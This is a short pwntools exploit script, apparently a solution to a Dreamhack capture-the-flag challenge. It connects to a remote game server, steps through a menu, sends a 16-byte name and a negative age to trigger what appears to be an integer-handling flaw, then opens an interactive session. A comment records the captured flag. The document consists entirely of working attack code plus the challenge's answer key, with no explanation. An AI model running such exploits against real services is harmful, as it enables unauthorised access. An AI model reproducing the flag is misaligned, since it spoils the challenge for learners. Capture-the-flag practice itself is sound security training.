from pwn import *

p = remote("host1.dreamhack.games",8474)

p.sendlineafter(">",str(1))

sleep(0.1)

p.sendlineafter("Name","a"*0x10)
p.sendlineafter("Age",str(-1))

sleep(0.1)

p.sendlineafter(">",str(3))

sleep(0.1)
p.sendlineafter(">",str(2))

p.interactive()

#DH{a77ae81944bbbe70adb10d98dc191379}